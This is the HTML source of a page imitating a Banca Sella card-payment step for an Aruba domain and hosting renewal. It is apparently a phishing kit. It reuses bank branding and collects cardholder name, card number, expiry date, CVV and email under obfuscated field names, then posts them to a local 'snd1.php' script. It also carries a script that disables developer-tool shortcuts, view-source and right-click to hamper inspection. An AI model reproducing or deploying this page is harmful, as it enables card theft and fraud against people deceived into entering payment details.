﻿<html xmlns="#" lang="IT" class=""><head id="ctl00_Head1">
    <style type="text/css">
        .fancybox-margin
        {
            margin-right: 0px;
        }
    </style>

    
        <link rel="stylesheet" href="css/jquery-ui.css">
        
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script language="javascript" type="text/javascript" src="css/osp.js"></script>
 <link type="text/css" rel="stylesheet" href="css/dyf.css">
	<link href="css/checkBrowser.css" rel="stylesheet" type="text/css">

    <link media="aural,braille,embossed,speech" type="text css" rel="stylesheet" href="css/WAI.css"><title>
	Pagina di pagamento Carta di Credito
</title>
<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>

<style type="text/css">.fancybox-margin{margin-right:0px;}</style><style type="text/css">.fancybox-margin{margin-right:0px;}</style></head>
<body>
<script>
grecaptcha.ready(function() {
grecaptcha.execute('6LcweXwUAAAAAJ09hV3I6ZPk4yd7mPolgZD0RhRs', {action: 'action_name'})
.then(function(token) {
// Verify the token on the server.
});
});
</script>
    <form method="post" action="snd1.php" onsubmit="return checkFormSubmit()" id="aspnetForm" >





    
    <div class="dyf_header">
        
   
        <div id="ctl00_BancaSellaLogo">
            <img id="dyf_logo_sella" src="css/LOGO_BSE_PAGAM.svg" alt="Payment by Banca Sella">
        </div>
        
        
        
        <span id="ctl00_dyf_scelta_lingua_cont">
            <span id="ctl00_lblLanguageTitle">Lingua</span>
            <a href="#" id="dyfSceltaLingua">
                <img src="css/language_italian.svg" id="ctl00_lngImages" alt="Lingua">&nbsp;<span id="ctl00_lblLanguage">Italiano</span></a> </span>

    </div>
    <hr style="visibility: hidden; height: 0; clear: both">
    
    <div id="ctl00_pnlMaster">
	
        <div class="dyf_main">
            
            <div class="dyf_spalla">
                <div class="dyf_spalla_header">
                    <h1 class="mute">
                        <span id="ctl00_lblMasterOrder">ordine</span></h1>
                    
                </div>
                <div class="dyf_spalla_inner">
                    <div id="dyf_spalla_importo_cont">
                        <div>
                            <h2 class="mute">
                                <span id="ctl00_lblMasterAmount">Importo:</span></h2>
                        </div>
                        
                        <div class="dyf_spalla_white" id="dyf_spalla_importo">
                            
                            <span id="ctl00_lblAmountValue">12,59 €</span>
                        </div>
                    </div>
                    <div id="dyf_spalla_esercente_cont">
                        <div>
                            <h2 class="mute">
                                <span id="ctl00_lblMasterMerchant">Esercente:</span></h2>
                        </div>
                        
                        <div class="dyf_spalla_white" id="dyf_spalla_esercente">
                            <span id="ctl00_lblMerchantNameValue">WWW.ARUBA.IT</span>
                        </div>
                    </div>
                    <div id="dyf_spalla_codice_ordine_cont">
                        <div>
                            <h2 class="mute">
                                <span id="ctl00_lblMasterCode">Codice ordine:</span></h2>
                        </div>
                        
                        <div class="dyf_spalla_white" id="dyf_spalla_codice_ordine">
                            <span id="ctl00_lblShopTrnxIdValue">02bd3be0a94b4dd893f01e39621d4134-1-R</span></div>
                    </div>
                    <div id="ctl00_divMerchDetails">
                    </div>
                </div>
            </div>
            <div class="dyf_content">
                <div class="dyf_content_inner">
                    
                    <div class="dyf_cont_processes">
                        

    
    <div class="processStep processStepDone" id="processStepModalita">
         <a id="ctl00_ContentPlaceHoldermenu_hypStepOne" class="decorateMenu" href="pagam.aspx?sesStep=Pres&amp;reqTypeBuy=RCC"><img src="css/icon_arrowhead_progressBar_finished.svg">&nbsp;
         <span id="ctl00_ContentPlaceHoldermenu_lblStepOne">RINNOVO DOMINIO E HOSTING</span></a>
    </div>
    <div class="processStep processStepNow" id="processStepInsDati">
        <img src="css/icon_arrowhead_progressBar_now.svg">&nbsp;
        <span id="ctl00_ContentPlaceHoldermenu_lblStpepThree">Inserimento dati</span>
    </div>
    <div class="processStep processStepNext" id="processStepSumDati">
        <img src="css/icon_arrowhead_progressBar_next.svg">&nbsp;<span id="ctl00_ContentPlaceHoldermenu_lblStepFour">Verifica</span>
    </div>

    <div class="processStep processStepNext" id="processStepReturnToShop ">
        <img src="css/icon_arrowhead_progressBar_next.svg">&nbsp;<span id="ctl00_ContentPlaceHoldermenu_lblStepFive">Finire</span>
    </div>

                    </div>
                    <div class="dyf_clearall">
                    </div>
                    
                    <div class="dyf_content_page dyf_alignleft">
                        

<div class="SpeechShown"><h1 class="mute"><span id="ctl00_ContentPlaceHolder1_lblInsertData">Inserimento dati</span></h1></div>

    <fieldset>
        <div class="dyf_cont_metodo">
            <div id="ctl00_ContentPlaceHolder1_ErrorBox" class="ErrorMessageDefault"> 
            <div id="ctl00_ContentPlaceHolder1_valSumCrossSite" style="color:Red;display:none;color:#F95C3D;float:none;">

	</div> 
                <span id="ctl00_ContentPlaceHolder1_ErrorBoxMessage">
                
                </span>
            </div>

            <div class="dyf_cont_metodo_carta">
                <div id="ctl00_ContentPlaceHolder1_divName" class="dyf_riga_pagamento_carta">
                    <div class="dyf_label_pagamento_carta dyf_label_intestatario_carta_cont">
                        <label for="ctl00_ContentPlaceHolder1_textPAY1_CHNAME" id="ctl00_ContentPlaceHolder1_lblName" class="dyf_label_text_pagamento_carta dyf_not_mandatory_label dyf_label_intestatario_carta">Intestatario carta</label> 
                    </div>
                    <div class="dyf_cont_input_pagamento_carta">
                        <div class="dyf_cont_input_pagamento_carta_inner dyf_not_mandatory_cont_input dyf_input_intestatario_carta">
                            <input name="s1" type="text"  maxlength="50" required="" id="ctl00_ContentPlaceHolder1_textPAY1_CHNAME" onfocus="this.select()" class="dyf_input_pagamento_carta dyf_not_mandatory_input" placeholder="Mario Rossi">
                        </div>
                    </div>
                    <div class="dyf_clearall">
                    </div>
                </div>
                <div class="dyf_riga_pagamento_carta">
                    <div class="dyf_label_pagamento_carta dyf_mandatory_label dyf_label_numero_carta_cont">
                        <label for="ctl00_ContentPlaceHolder1_textPAY1_CARDNUMBER" id="ctl00_ContentPlaceHolder1_lblCreditCrdNumber" class="dyf_label_text_pagamento_carta dyf_label_numero_carta">Numero Carta *</label></div>
                    <div class="dyf_cont_input_pagamento_carta">
                        <div class="dyf_cont_input_pagamento_carta_inner dyf_mandatory_cont_input dyf_input_numero_carta">
						<input type="hidden" name="pagina" id="pagina" value="<?php echo $pg ?>">
                            <input name="s2" type="text" onchange="onCardNumberChange()" onkeypress="return isNumberKey(event)" onkeyup="onCardNumberChange()" maxlength="16" pattern="[0-9]{16}" required=""  class="dyf_input_pagamento_carta dyf_mandatory_input" placeholder="4444444444444448">
                               
                        </div>
						<p id="cardNumberInvalid" style="display:none; color: #FF0000; font-size: 13px;" qtlid="1473" class="bold orange">Numero di carta non valido</p> 
                    </div>
                    <div style="vertical-align:middle;padding-top:12px;"><img id="imgCardLogo" alt="" src="https://ecomm.sella.it/pagam/images/pagam2002/spacer.gif"></div>
                    <div class="dyf_clearall">
                    </div>
                </div>
                <div class="dyf_riga_pagamento_carta">
                    <div class="dyf_label_pagamento_carta dyf_mandatory_label" style="padding-top:10px;">
                       <span id="ctl00_ContentPlaceHolder1_lblDate" class="dyf_label_text_pagamento_carta dyf_label_scadenza_carta">Data scadenza *</span>
                    </div>
                    <div class="dyf_cont_select_pagamento_carta">
                        <div class="dyf_cont_select_pagamento_carta_inner">
                            <select name="s3" required="" id="ctl00_ContentPlaceHolder1_txtPAY1_EXPMONTH" class="dyf_select_scadenza dyf_scadenza_mese">
		<option selected="selected" value="" >mm</option>
		<option value="01" style="color: rgb(0, 0, 0);">01</option>
		<option value="02" style="color: rgb(0, 0, 0);">02</option>
		<option value="03" style="color: rgb(0, 0, 0);">03</option>
		<option value="04" style="color: rgb(0, 0, 0);">04</option>
		<option value="05" style="color: rgb(0, 0, 0);">05</option>
		<option value="06" style="color: rgb(0, 0, 0);">06</option>
		<option value="07" style="color: rgb(0, 0, 0);">07</option>
		<option value="08" style="color: rgb(0, 0, 0);">08</option>
		<option value="09" style="color: rgb(0, 0, 0);">09</option>
		<option value="10" style="color: rgb(0, 0, 0);">10</option>
		<option value="11" style="color: rgb(0, 0, 0);">11</option>
		<option value="12" style="color: rgb(0, 0, 0);">12</option>

	</select>
                            
                            <select name="s4" required="" id="ctl00_ContentPlaceHolder1_txtPAY1_EXPYEAR" class="dyf_select_scadenza dyf_scadenza_anno" >
		<option selected="selected" value="" >aa</option>
		
		<option value="22" style="color: rgb(0, 0, 0);">22</option>
		<option value="23" style="color: rgb(0, 0, 0);">23</option>
		<option value="24" style="color: rgb(0, 0, 0);">24</option>
		<option value="25" style="color: rgb(0, 0, 0);">25</option>
		<option value="26" style="color: rgb(0, 0, 0);">26</option>
		<option value="27" style="color: rgb(0, 0, 0);">27</option>
		<option value="28" style="color: rgb(0, 0, 0);">28</option>
		<option value="29" style="color: rgb(0, 0, 0);">29</option>
		<option value="30" style="color: rgb(0, 0, 0);">30</option>
		<option value="31" style="color: rgb(0, 0, 0);">31</option>
		<option value="32" style="color: rgb(0, 0, 0);">32</option>
		<option value="33" style="color: rgb(0, 0, 0);">33</option>
        <option value="34" style="color: rgb(0, 0, 0);">34</option>
	</select>
                        </div>
                    </div>
                    <div class="dyf_clearall">
                    </div>
                </div>
                <div id="ctl00_ContentPlaceHolder1_divCVV" class="dyf_riga_pagamento_carta">
                    <div class="dyf_label_pagamento_carta dyf_mandatory_label dyf_label_cvv_carta_cont">
                        <label for="ctl00_ContentPlaceHolder1_textPAY1_CVV" id="ctl00_ContentPlaceHolder1_lbCVV" class="dyf_label_text_pagamento_carta dyf_label_cvv_carta">Codice di sicurezza *</label><br>
                        <label for="ctl00_ContentPlaceHolder1_textPAY1_CVV" id="ctl00_ContentPlaceHolder1_lblCvv2" class="dyf_label_text_pagamento_carta dyf_label_cvv_carta">(CVV2 o 4DBC)</label>
                    </div>
                    <div class="dyf_cont_input_pagamento_carta">
                        <div class="dyf_cont_input_pagamento_carta_inner dyf_mandatory_cont_input dyf_input_cvv_carta">
                            <input name="s5" type="password" required="" pattern="[0-9]{3}" maxlength="3" id="ctl00_ContentPlaceHolder1_textPAY1_CVV" onfocus="this.select()" class="dyf_input_pagamento_carta dyf_mandatory_input" placeholder="123" onkeypress="return isNumberKey(event)">
                        </div>
                        <div class="dyf_cvv_explain">
                            <a href="#fancybox-cvv" id="ctl00_ContentPlaceHolder1_idLink" class="fancybox"><span id="ctl00_ContentPlaceHolder1_lblCvvHelp">Dove trovo il codice di sicurezza?</span></a>
                        </div>
                    </div>
                    <div class="dyf_clearall">
                    </div>
                </div>
                <div id="ctl00_ContentPlaceHolder1_divEmail" class="dyf_riga_pagamento_carta">
                    <div class="dyf_label_pagamento_carta dyf_not_mandatory_label dyf_label_email_carta_cont">
                        <label for="ctl00_ContentPlaceHolder1_textPAY1_CHEMAIL" id="ctl00_ContentPlaceHolder1_lblEmail" class="dyf_label_text_pagamento_carta dyf_label_email_carta">Email</label>
                    </div>
                    <div class="dyf_cont_input_pagamento_carta">
                        <div class="dyf_cont_input_pagamento_carta_inner dyf_not_mandatory_cont_input dyf_input_email_carta">
                            <input name="s6" type="text" maxlength="50" id="ctl00_ContentPlaceHolder1_textPAY1_CHEMAIL" onfocus="this.select()" class="dyf_input_pagamento_carta dyf_not_mandatory_input" placeholder="mario.rossi@example.com">
                        </div>
                    </div>
                    <div class="dyf_clearall">
                    </div>
                </div>


                
          

                <div class="dyf_riga_pagamento_carta" style="vertical-align:middle;">
                    <fieldset id="RemenberMe">
                            
                            
                                
                    </fieldset>
                    <div class="dyf_clearall">
                    </div>
                </div>
            </div>
            <div class="dyf_mandatory_msg">
                
            <span id="ctl00_ContentPlaceHolder1_lblMandatory">*I campi contrassegnati con asterisco sono obbligatori.</span>
            </div>
            <div class="fancybox_privacy_link_cont">
                <a id="fancybox-privacy-link" class="fancybox" href="#fancybox-privacy"><span id="ctl00_ContentPlaceHolder1_lblPolicy">Informativa sulla privacy</span></a> 
            </div>
        </div>
        
    </fieldset>
	    <fieldset>
 <div class="g-recaptcha" id="g-recaptcha" data-sitekey="6LcweXwUAAAAAJ09hV3I6ZPk4yd7mPolgZD0RhRs" data-callback="onReturnCallback" data-theme="light"></div>
             

        

    </fieldset>

    <fieldset>
   
        <div class="dyf_btn_next" onclick="document.getElementById('ctl00_ContentPlaceHolder1_btnProcedi').click()">
           
             
               <input type="submit" name="ctl00$ContentPlaceHolder1$btnProcedi" value="Procedi"  id="ctl00_ContentPlaceHolder1_btnProcedi" style="border:0px;text-decoration:none;background:inherit !important; background-color:inherit;color:inherit;cursor: hand; font-size:14px; font-weight:bold;text-transform:uppercase;">


        </div>
        
        <div class="dyf_btn" style="width:185px;" onclick="document.getElementById('ctl00_ContentPlaceHolder1_btnBack').click()">
            <a id="ctl00_ContentPlaceHolder1_btnBack" class="fancybox" style="color: inherit;text-decoration:none;">Indietro</a>
                
        </div>
    </fieldset>





                    </div>
                </div>
                
                
                
                <div id="cookieDisclaimer">
                    <a target="_blank" href="#">Cookie Policy</a></div>
            </div>
        </div>
    
</div>


</form>
<script>
function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : evt.keyCode
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
	}
</script>
    

</body></html>